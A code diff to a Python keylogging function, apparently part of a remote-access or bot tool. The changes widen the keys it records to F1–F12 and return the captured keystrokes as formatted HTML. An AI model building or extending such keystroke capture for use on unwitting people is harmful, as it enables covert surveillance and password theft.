@@ -2,15 +2,16 @@ import datetime
 import keyboard
 from keyboard import KeyboardEvent
 import time
-import threading
-from .mac import get_mac
+
+from .html_generator import html_msg
 
 spec_key = {
     key: f'⌠{key}⌡'
     for key in [
         'ctrl', 'shift', 'tab',
         'esc', 'left windows', 'print screen',
-        'end', 'delete', 'f9',
+        'end', 'delete', 'f1', 'f2', 'f3', 'f4', 
+        'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12',
         'insert', 'down', 'page down',
         'right', 'clear', 'left',
         'home', 'up', 'num lock',
@@ -47,10 +48,10 @@ def get_key_log(duration = 5):
     time.sleep(duration)
     keyboard.unhook_all()
 
-    content = f'{duration} (s) of key logging (from: {_time}): ' + ''.join(logger)
+    content = f'{duration} seconds of key logging (from: {_time}): <span style="font-weight: bold;">' + ''.join(logger) + '</span>'
     
     response = {
-        'html': content,
+        'html': html_msg(content, status=None, bold_all=False),
         'data': None
     }
     
